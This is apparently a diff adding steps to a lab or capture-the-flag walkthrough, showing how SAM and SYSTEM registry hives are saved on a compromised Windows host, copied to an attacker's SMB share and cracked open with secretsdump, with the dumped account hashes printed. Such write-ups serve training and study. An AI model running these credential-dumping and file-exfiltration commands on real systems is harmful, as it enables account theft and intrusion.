@@ -421,3 +421,33 @@ C:\Windows\system32>whoami
 whoami
 nt authority\system
 ```
+- Next task is to dump credentials in the sam file. For this, I use the commands below.
+```powershell
+reg.exe save HKLM\SYSTEM system.bak
+reg.exe save HKLM\SAM sam.bak
+```
+- Then, I parse the files using smbserver.
+```powershell
+# On attacking machine
+└─$ smbserver.py s . -smb2support -username user -password password
+
+# On Windows target machine
+net use \\10.50.76.115\s /USER:user password
+```
+- After that, I move both `.bak` files to our local machine.
+```powershell
+move sam.bak \\10.50.76.115\s\sam.bak
+move system.bak \\10.50.76.115\s\system.bak
+```
+- Using `secretsdump.py` I dumped the credentials of the system.
+```bash
+└─$ secretsdump.py -sam sam.bak -system system.bak LOCAL
+
+[*] Target system bootKey: 0xfce6f31c003e4157e8cb1bc59f4720e6
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2:::
+Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
+```
